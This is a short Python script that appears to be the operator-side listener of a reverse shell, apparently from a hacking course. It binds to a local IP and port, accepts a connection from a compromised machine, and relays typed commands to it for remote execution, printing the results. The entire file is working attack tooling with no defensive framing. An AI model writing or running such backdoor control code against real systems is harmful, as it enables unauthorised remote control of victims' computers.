#!/usr/bin/env python
import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.client, self.addr = listener.accept()
        print("[+] Got new connection: "+str(self.addr))

    def execute_remotely(self, command):
        self.client.send(command.encode('utf-8'))
        return self.client.recv(1024)

    def run(self):
        while True:
            command = input("[Command]>>")
            result = self.execute_remotely(command)
            print(result.decode('utf-8'))


if __name__ == '__main__':
    listener = Listener("192.168.0.100", 8080)
    listener.run()